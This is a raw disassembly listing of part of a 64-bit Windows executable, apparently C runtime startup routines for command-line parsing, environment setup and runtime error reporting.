   140007443:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   140007447:	75 16                	jne    0x14000745f
   140007449:	8b 48 20             	mov    0x20(%rax),%ecx
   14000744c:	8d 81 e0 fa 6c e6    	lea    -0x19930520(%rcx),%eax
   140007452:	83 f8 02             	cmp    $0x2,%eax
   140007455:	76 0f                	jbe    0x140007466
   140007457:	81 f9 00 40 99 01    	cmp    $0x1994000,%ecx
   14000745d:	74 07                	je     0x140007466
   14000745f:	33 c0                	xor    %eax,%eax
   140007461:	48 83 c4 28          	add    $0x28,%rsp
   140007465:	c3                   	ret
   140007466:	e8 3d 2d 00 00       	call   0x14000a1a8
   14000746b:	cc                   	int3
   14000746c:	48 83 ec 28          	sub    $0x28,%rsp
   140007470:	48 8d 0d bd ff ff ff 	lea    -0x43(%rip),%rcx        # 0x140007434
   140007477:	e8 54 c9 ff ff       	call   0x140003dd0
   14000747c:	33 c0                	xor    %eax,%eax
   14000747e:	48 83 c4 28          	add    $0x28,%rsp
   140007482:	c3                   	ret
   140007483:	cc                   	int3
   140007484:	48 83 ec 28          	sub    $0x28,%rsp
   140007488:	ff 15 2a 9d 00 00    	call   *0x9d2a(%rip)        # 0x1400111b8
   14000748e:	33 c9                	xor    %ecx,%ecx
   140007490:	48 85 c0             	test   %rax,%rax
   140007493:	48 89 05 d6 3c 01 00 	mov    %rax,0x13cd6(%rip)        # 0x14001b170
   14000749a:	0f 95 c1             	setne  %cl
   14000749d:	8b c1                	mov    %ecx,%eax
   14000749f:	48 83 c4 28          	add    $0x28,%rsp
   1400074a3:	c3                   	ret
   1400074a4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400074a9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400074ae:	57                   	push   %rdi
   1400074af:	48 83 ec 30          	sub    $0x30,%rsp
   1400074b3:	83 3d 9e 47 01 00 00 	cmpl   $0x0,0x1479e(%rip)        # 0x14001bc58
   1400074ba:	75 05                	jne    0x1400074c1
   1400074bc:	e8 4b 1c 00 00       	call   0x14000910c
   1400074c1:	48 8d 3d b8 3c 01 00 	lea    0x13cb8(%rip),%rdi        # 0x14001b180
   1400074c8:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400074ce:	33 c9                	xor    %ecx,%ecx
   1400074d0:	48 8b d7             	mov    %rdi,%rdx
   1400074d3:	c6 05 aa 3d 01 00 00 	movb   $0x0,0x13daa(%rip)        # 0x14001b284
   1400074da:	ff 15 e0 9c 00 00    	call   *0x9ce0(%rip)        # 0x1400111c0
   1400074e0:	48 8b 1d a9 58 01 00 	mov    0x158a9(%rip),%rbx        # 0x14001cd90
   1400074e7:	48 89 3d 4a 3c 01 00 	mov    %rdi,0x13c4a(%rip)        # 0x14001b138
   1400074ee:	48 85 db             	test   %rbx,%rbx
   1400074f1:	74 05                	je     0x1400074f8
   1400074f3:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400074f6:	75 03                	jne    0x1400074fb
   1400074f8:	48 8b df             	mov    %rdi,%rbx
   1400074fb:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140007500:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140007505:	45 33 c0             	xor    %r8d,%r8d
   140007508:	33 d2                	xor    %edx,%edx
   14000750a:	48 8b cb             	mov    %rbx,%rcx
   14000750d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007512:	e8 81 00 00 00       	call   0x140007598
   140007517:	48 63 74 24 40       	movslq 0x40(%rsp),%rsi
   14000751c:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   140007523:	ff ff 1f 
   140007526:	48 3b f1             	cmp    %rcx,%rsi
   140007529:	73 59                	jae    0x140007584
   14000752b:	48 63 4c 24 48       	movslq 0x48(%rsp),%rcx
   140007530:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140007534:	73 4e                	jae    0x140007584
   140007536:	48 8d 14 f1          	lea    (%rcx,%rsi,8),%rdx
   14000753a:	48 3b d1             	cmp    %rcx,%rdx
   14000753d:	72 45                	jb     0x140007584
   14000753f:	48 8b ca             	mov    %rdx,%rcx
   140007542:	e8 ed fd ff ff       	call   0x140007334
   140007547:	48 8b f8             	mov    %rax,%rdi
   14000754a:	48 85 c0             	test   %rax,%rax
   14000754d:	74 35                	je     0x140007584
   14000754f:	4c 8d 04 f0          	lea    (%rax,%rsi,8),%r8
   140007553:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140007558:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000755d:	48 8b d7             	mov    %rdi,%rdx
   140007560:	48 8b cb             	mov    %rbx,%rcx
   140007563:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007568:	e8 2b 00 00 00       	call   0x140007598
   14000756d:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140007571:	48 89 3d a0 3b 01 00 	mov    %rdi,0x13ba0(%rip)        # 0x14001b118
   140007578:	ff c8                	dec    %eax
   14000757a:	89 05 94 3b 01 00    	mov    %eax,0x13b94(%rip)        # 0x14001b114
   140007580:	33 c0                	xor    %eax,%eax
   140007582:	eb 03                	jmp    0x140007587
   140007584:	83 c8 ff             	or     $0xffffffff,%eax
   140007587:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000758c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140007591:	48 83 c4 30          	add    $0x30,%rsp
   140007595:	5f                   	pop    %rdi
   140007596:	c3                   	ret
   140007597:	cc                   	int3
   140007598:	48 8b c4             	mov    %rsp,%rax
   14000759b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000759f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400075a3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400075a7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400075ab:	41 54                	push   %r12
   1400075ad:	41 56                	push   %r14
   1400075af:	41 57                	push   %r15
   1400075b1:	48 83 ec 20          	sub    $0x20,%rsp
   1400075b5:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
   1400075ba:	4d 8b e1             	mov    %r9,%r12
   1400075bd:	49 8b f8             	mov    %r8,%rdi
   1400075c0:	41 83 26 00          	andl   $0x0,(%r14)
   1400075c4:	4c 8b fa             	mov    %rdx,%r15
   1400075c7:	48 8b d9             	mov    %rcx,%rbx
   1400075ca:	41 c7 01 01 00 00 00 	movl   $0x1,(%r9)
   1400075d1:	48 85 d2             	test   %rdx,%rdx
   1400075d4:	74 07                	je     0x1400075dd
   1400075d6:	4c 89 02             	mov    %r8,(%rdx)
   1400075d9:	49 83 c7 08          	add    $0x8,%r15
   1400075dd:	33 ed                	xor    %ebp,%ebp
   1400075df:	80 3b 22             	cmpb   $0x22,(%rbx)
   1400075e2:	75 11                	jne    0x1400075f5
   1400075e4:	33 c0                	xor    %eax,%eax
   1400075e6:	85 ed                	test   %ebp,%ebp
   1400075e8:	40 b6 22             	mov    $0x22,%sil
   1400075eb:	0f 94 c0             	sete   %al
   1400075ee:	48 ff c3             	inc    %rbx
   1400075f1:	8b e8                	mov    %eax,%ebp
   1400075f3:	eb 37                	jmp    0x14000762c
   1400075f5:	41 ff 06             	incl   (%r14)
   1400075f8:	48 85 ff             	test   %rdi,%rdi
   1400075fb:	74 07                	je     0x140007604
   1400075fd:	8a 03                	mov    (%rbx),%al
   1400075ff:	88 07                	mov    %al,(%rdi)
   140007601:	48 ff c7             	inc    %rdi
   140007604:	0f b6 33             	movzbl (%rbx),%esi
   140007607:	48 ff c3             	inc    %rbx
   14000760a:	8b ce                	mov    %esi,%ecx
   14000760c:	e8 37 30 00 00       	call   0x14000a648
   140007611:	85 c0                	test   %eax,%eax
   140007613:	74 12                	je     0x140007627
   140007615:	41 ff 06             	incl   (%r14)
   140007618:	48 85 ff             	test   %rdi,%rdi
   14000761b:	74 07                	je     0x140007624
   14000761d:	8a 03                	mov    (%rbx),%al
   14000761f:	88 07                	mov    %al,(%rdi)
   140007621:	48 ff c7             	inc    %rdi
   140007624:	48 ff c3             	inc    %rbx
   140007627:	40 84 f6             	test   %sil,%sil
   14000762a:	74 1b                	je     0x140007647
   14000762c:	85 ed                	test   %ebp,%ebp
   14000762e:	75 af                	jne    0x1400075df
   140007630:	40 80 fe 20          	cmp    $0x20,%sil
   140007634:	74 06                	je     0x14000763c
   140007636:	40 80 fe 09          	cmp    $0x9,%sil
   14000763a:	75 a3                	jne    0x1400075df
   14000763c:	48 85 ff             	test   %rdi,%rdi
   14000763f:	74 09                	je     0x14000764a
   140007641:	c6 47 ff 00          	movb   $0x0,-0x1(%rdi)
   140007645:	eb 03                	jmp    0x14000764a
   140007647:	48 ff cb             	dec    %rbx
   14000764a:	33 f6                	xor    %esi,%esi
   14000764c:	80 3b 00             	cmpb   $0x0,(%rbx)
   14000764f:	0f 84 de 00 00 00    	je     0x140007733
   140007655:	80 3b 20             	cmpb   $0x20,(%rbx)
   140007658:	74 05                	je     0x14000765f
   14000765a:	80 3b 09             	cmpb   $0x9,(%rbx)
   14000765d:	75 05                	jne    0x140007664
   14000765f:	48 ff c3             	inc    %rbx
   140007662:	eb f1                	jmp    0x140007655
   140007664:	80 3b 00             	cmpb   $0x0,(%rbx)
   140007667:	0f 84 c6 00 00 00    	je     0x140007733
   14000766d:	4d 85 ff             	test   %r15,%r15
   140007670:	74 07                	je     0x140007679
   140007672:	49 89 3f             	mov    %rdi,(%r15)
   140007675:	49 83 c7 08          	add    $0x8,%r15
   140007679:	41 ff 04 24          	incl   (%r12)
   14000767d:	ba 01 00 00 00       	mov    $0x1,%edx
   140007682:	33 c9                	xor    %ecx,%ecx
   140007684:	eb 05                	jmp    0x14000768b
   140007686:	48 ff c3             	inc    %rbx
   140007689:	ff c1                	inc    %ecx
   14000768b:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   14000768e:	74 f6                	je     0x140007686
   140007690:	80 3b 22             	cmpb   $0x22,(%rbx)
   140007693:	75 35                	jne    0x1400076ca
   140007695:	84 ca                	test   %cl,%dl
   140007697:	75 1d                	jne    0x1400076b6
   140007699:	85 f6                	test   %esi,%esi
   14000769b:	74 0e                	je     0x1400076ab
   14000769d:	48 8d 43 01          	lea    0x1(%rbx),%rax
   1400076a1:	80 38 22             	cmpb   $0x22,(%rax)
   1400076a4:	75 05                	jne    0x1400076ab
   1400076a6:	48 8b d8             	mov    %rax,%rbx
   1400076a9:	eb 0b                	jmp    0x1400076b6
   1400076ab:	33 c0                	xor    %eax,%eax
   1400076ad:	33 d2                	xor    %edx,%edx
   1400076af:	85 f6                	test   %esi,%esi
   1400076b1:	0f 94 c0             	sete   %al
   1400076b4:	8b f0                	mov    %eax,%esi
   1400076b6:	d1 e9                	shr    $1,%ecx
   1400076b8:	eb 10                	jmp    0x1400076ca
   1400076ba:	ff c9                	dec    %ecx
   1400076bc:	48 85 ff             	test   %rdi,%rdi
   1400076bf:	74 06                	je     0x1400076c7
   1400076c1:	c6 07 5c             	movb   $0x5c,(%rdi)
   1400076c4:	48 ff c7             	inc    %rdi
   1400076c7:	41 ff 06             	incl   (%r14)
   1400076ca:	85 c9                	test   %ecx,%ecx
   1400076cc:	75 ec                	jne    0x1400076ba
   1400076ce:	8a 03                	mov    (%rbx),%al
   1400076d0:	84 c0                	test   %al,%al
   1400076d2:	74 4c                	je     0x140007720
   1400076d4:	85 f6                	test   %esi,%esi
   1400076d6:	75 08                	jne    0x1400076e0
   1400076d8:	3c 20                	cmp    $0x20,%al
   1400076da:	74 44                	je     0x140007720
   1400076dc:	3c 09                	cmp    $0x9,%al
   1400076de:	74 40                	je     0x140007720
   1400076e0:	85 d2                	test   %edx,%edx
   1400076e2:	74 34                	je     0x140007718
   1400076e4:	0f be c8             	movsbl %al,%ecx
   1400076e7:	e8 5c 2f 00 00       	call   0x14000a648
   1400076ec:	48 85 ff             	test   %rdi,%rdi
   1400076ef:	74 1a                	je     0x14000770b
   1400076f1:	85 c0                	test   %eax,%eax
   1400076f3:	74 0d                	je     0x140007702
   1400076f5:	8a 03                	mov    (%rbx),%al
   1400076f7:	48 ff c3             	inc    %rbx
   1400076fa:	88 07                	mov    %al,(%rdi)
   1400076fc:	48 ff c7             	inc    %rdi
   1400076ff:	41 ff 06             	incl   (%r14)
   140007702:	8a 03                	mov    (%rbx),%al
   140007704:	88 07                	mov    %al,(%rdi)
   140007706:	48 ff c7             	inc    %rdi
   140007709:	eb 0a                	jmp    0x140007715
   14000770b:	85 c0                	test   %eax,%eax
   14000770d:	74 06                	je     0x140007715
   14000770f:	48 ff c3             	inc    %rbx
   140007712:	41 ff 06             	incl   (%r14)
   140007715:	41 ff 06             	incl   (%r14)
   140007718:	48 ff c3             	inc    %rbx
   14000771b:	e9 5d ff ff ff       	jmp    0x14000767d
   140007720:	48 85 ff             	test   %rdi,%rdi
   140007723:	74 06                	je     0x14000772b
   140007725:	c6 07 00             	movb   $0x0,(%rdi)
   140007728:	48 ff c7             	inc    %rdi
   14000772b:	41 ff 06             	incl   (%r14)
   14000772e:	e9 19 ff ff ff       	jmp    0x14000764c
   140007733:	4d 85 ff             	test   %r15,%r15
   140007736:	74 04                	je     0x14000773c
   140007738:	49 83 27 00          	andq   $0x0,(%r15)
   14000773c:	41 ff 04 24          	incl   (%r12)
   140007740:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007745:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000774a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000774f:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140007754:	48 83 c4 20          	add    $0x20,%rsp
   140007758:	41 5f                	pop    %r15
   14000775a:	41 5e                	pop    %r14
   14000775c:	41 5c                	pop    %r12
   14000775e:	c3                   	ret
   14000775f:	cc                   	int3
   140007760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007765:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000776a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000776f:	57                   	push   %rdi
   140007770:	48 83 ec 30          	sub    $0x30,%rsp
   140007774:	83 3d dd 44 01 00 00 	cmpl   $0x0,0x144dd(%rip)        # 0x14001bc58
   14000777b:	75 05                	jne    0x140007782
   14000777d:	e8 8a 19 00 00       	call   0x14000910c
   140007782:	48 8b 1d 47 37 01 00 	mov    0x13747(%rip),%rbx        # 0x14001aed0
   140007789:	33 ff                	xor    %edi,%edi
   14000778b:	48 85 db             	test   %rbx,%rbx
   14000778e:	75 1c                	jne    0x1400077ac
   140007790:	83 c8 ff             	or     $0xffffffff,%eax
   140007793:	e9 b5 00 00 00       	jmp    0x14000784d
   140007798:	3c 3d                	cmp    $0x3d,%al
   14000779a:	74 02                	je     0x14000779e
   14000779c:	ff c7                	inc    %edi
   14000779e:	48 8b cb             	mov    %rbx,%rcx
   1400077a1:	e8 aa b3 ff ff       	call   0x140002b50
   1400077a6:	48 ff c3             	inc    %rbx
   1400077a9:	48 03 d8             	add    %rax,%rbx
   1400077ac:	8a 03                	mov    (%rbx),%al
   1400077ae:	84 c0                	test   %al,%al
   1400077b0:	75 e6                	jne    0x140007798
   1400077b2:	8d 47 01             	lea    0x1(%rdi),%eax
   1400077b5:	ba 08 00 00 00       	mov    $0x8,%edx
   1400077ba:	48 63 c8             	movslq %eax,%rcx
   1400077bd:	e8 f2 fa ff ff       	call   0x1400072b4
   1400077c2:	48 8b f8             	mov    %rax,%rdi
   1400077c5:	48 89 05 5c 39 01 00 	mov    %rax,0x1395c(%rip)        # 0x14001b128
   1400077cc:	48 85 c0             	test   %rax,%rax
   1400077cf:	74 bf                	je     0x140007790
   1400077d1:	48 8b 1d f8 36 01 00 	mov    0x136f8(%rip),%rbx        # 0x14001aed0
   1400077d8:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400077db:	74 50                	je     0x14000782d
   1400077dd:	48 8b cb             	mov    %rbx,%rcx
   1400077e0:	e8 6b b3 ff ff       	call   0x140002b50
   1400077e5:	80 3b 3d             	cmpb   $0x3d,(%rbx)
   1400077e8:	8d 70 01             	lea    0x1(%rax),%esi
   1400077eb:	74 2e                	je     0x14000781b
   1400077ed:	48 63 ee             	movslq %esi,%rbp
   1400077f0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400077f5:	48 8b cd             	mov    %rbp,%rcx
   1400077f8:	e8 b7 fa ff ff       	call   0x1400072b4
   1400077fd:	48 89 07             	mov    %rax,(%rdi)
   140007800:	48 85 c0             	test   %rax,%rax
   140007803:	74 5d                	je     0x140007862
   140007805:	4c 8b c3             	mov    %rbx,%r8
   140007808:	48 8b d5             	mov    %rbp,%rdx
   14000780b:	48 8b c8             	mov    %rax,%rcx
   14000780e:	e8 39 06 00 00       	call   0x140007e4c
   140007813:	85 c0                	test   %eax,%eax
   140007815:	75 64                	jne    0x14000787b
   140007817:	48 83 c7 08          	add    $0x8,%rdi
   14000781b:	48 63 c6             	movslq %esi,%rax
   14000781e:	48 03 d8             	add    %rax,%rbx
   140007821:	80 3b 00             	cmpb   $0x0,(%rbx)
   140007824:	75 b7                	jne    0x1400077dd
   140007826:	48 8b 1d a3 36 01 00 	mov    0x136a3(%rip),%rbx        # 0x14001aed0
   14000782d:	48 8b cb             	mov    %rbx,%rcx
   140007830:	e8 5f bf ff ff       	call   0x140003794
   140007835:	48 83 25 93 36 01 00 	andq   $0x0,0x13693(%rip)        # 0x14001aed0
   14000783c:	00 
   14000783d:	48 83 27 00          	andq   $0x0,(%rdi)
   140007841:	c7 05 11 44 01 00 01 	movl   $0x1,0x14411(%rip)        # 0x14001bc5c
   140007848:	00 00 00 
   14000784b:	33 c0                	xor    %eax,%eax
   14000784d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007852:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140007857:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000785c:	48 83 c4 30          	add    $0x30,%rsp
   140007860:	5f                   	pop    %rdi
   140007861:	c3                   	ret
   140007862:	48 8b 0d bf 38 01 00 	mov    0x138bf(%rip),%rcx        # 0x14001b128
   140007869:	e8 26 bf ff ff       	call   0x140003794
   14000786e:	48 83 25 b2 38 01 00 	andq   $0x0,0x138b2(%rip)        # 0x14001b128
   140007875:	00 
   140007876:	e9 15 ff ff ff       	jmp    0x140007790
   14000787b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007881:	45 33 c9             	xor    %r9d,%r9d
   140007884:	45 33 c0             	xor    %r8d,%r8d
   140007887:	33 d2                	xor    %edx,%edx
   140007889:	33 c9                	xor    %ecx,%ecx
   14000788b:	e8 b8 c8 ff ff       	call   0x140004148
   140007890:	cc                   	int3
   140007891:	cc                   	int3
   140007892:	cc                   	int3
   140007893:	cc                   	int3
   140007894:	48 83 ec 28          	sub    $0x28,%rsp
   140007898:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000789d:	e8 de 02 00 00       	call   0x140007b80
   1400078a2:	83 f8 01             	cmp    $0x1,%eax
   1400078a5:	74 17                	je     0x1400078be
   1400078a7:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400078ac:	e8 cf 02 00 00       	call   0x140007b80
   1400078b1:	85 c0                	test   %eax,%eax
   1400078b3:	75 1d                	jne    0x1400078d2
   1400078b5:	83 3d d4 39 01 00 01 	cmpl   $0x1,0x139d4(%rip)        # 0x14001b290
   1400078bc:	75 14                	jne    0x1400078d2
   1400078be:	b9 fc 00 00 00       	mov    $0xfc,%ecx
   1400078c3:	e8 40 00 00 00       	call   0x140007908
   1400078c8:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400078cd:	e8 36 00 00 00       	call   0x140007908
   1400078d2:	48 83 c4 28          	add    $0x28,%rsp
   1400078d6:	c3                   	ret
   1400078d7:	cc                   	int3
   1400078d8:	4c 8d 0d 31 a2 00 00 	lea    0xa231(%rip),%r9        # 0x140011b10
   1400078df:	33 d2                	xor    %edx,%edx
   1400078e1:	4d 8b c1             	mov    %r9,%r8
   1400078e4:	41 3b 08             	cmp    (%r8),%ecx
   1400078e7:	74 12                	je     0x1400078fb
   1400078e9:	ff c2                	inc    %edx
   1400078eb:	49 83 c0 10          	add    $0x10,%r8
   1400078ef:	48 63 c2             	movslq %edx,%rax
   1400078f2:	48 83 f8 17          	cmp    $0x17,%rax
   1400078f6:	72 ec                	jb     0x1400078e4
   1400078f8:	33 c0                	xor    %eax,%eax
   1400078fa:	c3                   	ret
   1400078fb:	48 63 c2             	movslq %edx,%rax
   1400078fe:	48 03 c0             	add    %rax,%rax
   140007901:	49 8b 44 c1 08       	mov    0x8(%r9,%rax,8),%rax
   140007906:	c3                   	ret
   140007907:	cc                   	int3
   140007908:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000790d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140007912:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007917:	57                   	push   %rdi
   140007918:	41 56                	push   %r14
   14000791a:	41 57                	push   %r15
   14000791c:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   140007923:	48 8b 05 d6 16 01 00 	mov    0x116d6(%rip),%rax        # 0x140019000
   14000792a:	48 33 c4             	xor    %rsp,%rax
   14000792d:	48 89 84 24 40 02 00 	mov    %rax,0x240(%rsp)
   140007934:	00 
   140007935:	8b f9                	mov    %ecx,%edi
   140007937:	e8 9c ff ff ff       	call   0x1400078d8
   14000793c:	33 f6                	xor    %esi,%esi
   14000793e:	48 8b d8             	mov    %rax,%rbx
   140007941:	48 85 c0             	test   %rax,%rax
   140007944:	0f 84 99 01 00 00    	je     0x140007ae3
   14000794a:	8d 4e 03             	lea    0x3(%rsi),%ecx
   14000794d:	e8 2e 02 00 00       	call   0x140007b80
   140007952:	83 f8 01             	cmp    $0x1,%eax
   140007955:	0f 84 1d 01 00 00    	je     0x140007a78
   14000795b:	8d 4e 03             	lea    0x3(%rsi),%ecx
   14000795e:	e8 1d 02 00 00       	call   0x140007b80
   140007963:	85 c0                	test   %eax,%eax
   140007965:	75 0d                	jne    0x140007974
   140007967:	83 3d 22 39 01 00 01 	cmpl   $0x1,0x13922(%rip)        # 0x14001b290
   14000796e:	0f 84 04 01 00 00    	je     0x140007a78
   140007974:	81 ff fc 00 00 00    	cmp    $0xfc,%edi
   14000797a:	0f 84 63 01 00 00    	je     0x140007ae3
   140007980:	48 8d 2d 19 39 01 00 	lea    0x13919(%rip),%rbp        # 0x14001b2a0
   140007987:	41 bf 14 03 00 00    	mov    $0x314,%r15d
   14000798d:	4c 8d 05 1c ac 00 00 	lea    0xac1c(%rip),%r8        # 0x1400125b0
   140007994:	48 8b cd             	mov    %rbp,%rcx
   140007997:	41 8b d7             	mov    %r15d,%edx
   14000799a:	e8 45 2d 00 00       	call   0x14000a6e4
   14000799f:	33 c9                	xor    %ecx,%ecx
   1400079a1:	85 c0                	test   %eax,%eax
   1400079a3:	0f 85 bb 01 00 00    	jne    0x140007b64
   1400079a9:	4c 8d 35 22 39 01 00 	lea    0x13922(%rip),%r14        # 0x14001b2d2
   1400079b0:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400079b6:	66 89 35 1d 3b 01 00 	mov    %si,0x13b1d(%rip)        # 0x14001b4da
   1400079bd:	49 8b d6             	mov    %r14,%rdx
   1400079c0:	ff 15 02 98 00 00    	call   *0x9802(%rip)        # 0x1400111c8
   1400079c6:	41 8d 7f e7          	lea    -0x19(%r15),%edi
   1400079ca:	85 c0                	test   %eax,%eax
   1400079cc:	75 19                	jne    0x1400079e7
   1400079ce:	4c 8d 05 13 ac 00 00 	lea    0xac13(%rip),%r8        # 0x1400125e8
   1400079d5:	8b d7                	mov    %edi,%edx
   1400079d7:	49 8b ce             	mov    %r14,%rcx
   1400079da:	e8 05 2d 00 00       	call   0x14000a6e4
   1400079df:	85 c0                	test   %eax,%eax
   1400079e1:	0f 85 29 01 00 00    	jne    0x140007b10
   1400079e7:	49 8b ce             	mov    %r14,%rcx
   1400079ea:	e8 61 2d 00 00       	call   0x14000a750
   1400079ef:	48 ff c0             	inc    %rax
   1400079f2:	48 83 f8 3c          	cmp    $0x3c,%rax
   1400079f6:	76 39                	jbe    0x140007a31
   1400079f8:	49 8b ce             	mov    %r14,%rcx
   1400079fb:	e8 50 2d 00 00       	call   0x14000a750
   140007a00:	48 8d 4d bc          	lea    -0x44(%rbp),%rcx
   140007a04:	4c 8d 05 0d ac 00 00 	lea    0xac0d(%rip),%r8        # 0x140012618
   140007a0b:	48 8d 0c 41          	lea    (%rcx,%rax,2),%rcx
   140007a0f:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140007a15:	48 8b c1             	mov    %rcx,%rax
   140007a18:	49 2b c6             	sub    %r14,%rax
   140007a1b:	48 d1 f8             	sar    $1,%rax
   140007a1e:	48 2b f8             	sub    %rax,%rdi
   140007a21:	48 8b d7             	mov    %rdi,%rdx
   140007a24:	e8 43 2d 00 00       	call   0x14000a76c
   140007a29:	85 c0                	test   %eax,%eax
   140007a2b:	0f 85 f4 00 00 00    	jne    0x140007b25
   140007a31:	4c 8d 05 e8 ab 00 00 	lea    0xabe8(%rip),%r8        # 0x140012620
   140007a38:	49 8b d7             	mov    %r15,%rdx
   140007a3b:	48 8b cd             	mov    %rbp,%rcx
   140007a3e:	e8 19 2c 00 00       	call   0x14000a65c
   140007a43:	85 c0                	test   %eax,%eax
   140007a45:	0f 85 04 01 00 00    	jne    0x140007b4f
   140007a4b:	4c 8b c3             	mov    %rbx,%r8
   140007a4e:	49 8b d7             	mov    %r15,%rdx
   140007a51:	48 8b cd             	mov    %rbp,%rcx
   140007a54:	e8 03 2c 00 00       	call   0x14000a65c
   140007a59:	85 c0                	test   %eax,%eax
   140007a5b:	0f 85 d9 00 00 00    	jne    0x140007b3a
   140007a61:	48 8d 15 c8 ab 00 00 	lea    0xabc8(%rip),%rdx        # 0x140012630
   140007a68:	41 b8 10 20 01 00    	mov    $0x12010,%r8d
   140007a6e:	48 8b cd             	mov    %rbp,%rcx
   140007a71:	e8 c2 2d 00 00       	call   0x14000a838
   140007a76:	eb 6b                	jmp    0x140007ae3
   140007a78:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140007a7d:	ff 15 dd 96 00 00    	call   *0x96dd(%rip)        # 0x140011160
   140007a83:	48 8b f8             	mov    %rax,%rdi
   140007a86:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   140007a8a:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   140007a8e:	77 53                	ja     0x140007ae3
   140007a90:	44 8b c6             	mov    %esi,%r8d
   140007a93:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140007a98:	8a 0b                	mov    (%rbx),%cl
   140007a9a:	88 0a                	mov    %cl,(%rdx)
   140007a9c:	66 39 33             	cmp    %si,(%rbx)
   140007a9f:	74 15                	je     0x140007ab6
   140007aa1:	41 ff c0             	inc    %r8d
   140007aa4:	48 ff c2             	inc    %rdx
   140007aa7:	48 83 c3 02          	add    $0x2,%rbx
   140007aab:	49 63 c0             	movslq %r8d,%rax
   140007aae:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
   140007ab4:	72 e2                	jb     0x140007a98
   140007ab6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007abb:	40 88 b4 24 33 02 00 	mov    %sil,0x233(%rsp)
   140007ac2:	00 
   140007ac3:	e8 88 b0 ff ff       	call   0x140002b50
   140007ac8:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140007acd:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140007ad2:	48 8b cf             	mov    %rdi,%rcx
   140007ad5:	4c 8b c0             	mov    %rax,%r8
   140007ad8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007add:	ff 15 95 96 00 00    	call   *0x9695(%rip)        # 0x140011178
   140007ae3:	48 8b 8c 24 40 02 00 	mov    0x240(%rsp),%rcx
   140007aea:	00 
   140007aeb:	48 33 cc             	xor    %rsp,%rcx
   140007aee:	e8 4d b7 ff ff       	call   0x140003240
   140007af3:	4c 8d 9c 24 50 02 00 	lea    0x250(%rsp),%r11
   140007afa:	00 
   140007afb:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140007aff:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140007b03:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140007b07:	49 8b e3             	mov    %r11,%rsp
   140007b0a:	41 5f                	pop    %r15
   140007b0c:	41 5e                	pop    %r14
   140007b0e:	5f                   	pop    %rdi
   140007b0f:	c3                   	ret
   140007b10:	45 33 c9             	xor    %r9d,%r9d
   140007b13:	45 33 c0             	xor    %r8d,%r8d
   140007b16:	33 d2                	xor    %edx,%edx
   140007b18:	33 c9                	xor    %ecx,%ecx
   140007b1a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007b1f:	e8 24 c6 ff ff       	call   0x140004148
   140007b24:	cc                   	int3
   140007b25:	45 33 c9             	xor    %r9d,%r9d
   140007b28:	45 33 c0             	xor    %r8d,%r8d
   140007b2b:	33 d2                	xor    %edx,%edx
   140007b2d:	33 c9                	xor    %ecx,%ecx
   140007b2f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007b34:	e8 0f c6 ff ff       	call   0x140004148
   140007b39:	cc                   	int3
   140007b3a:	45 33 c9             	xor    %r9d,%r9d
   140007b3d:	45 33 c0             	xor    %r8d,%r8d
   140007b40:	33 d2                	xor    %edx,%edx
   140007b42:	33 c9                	xor    %ecx,%ecx
   140007b44:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
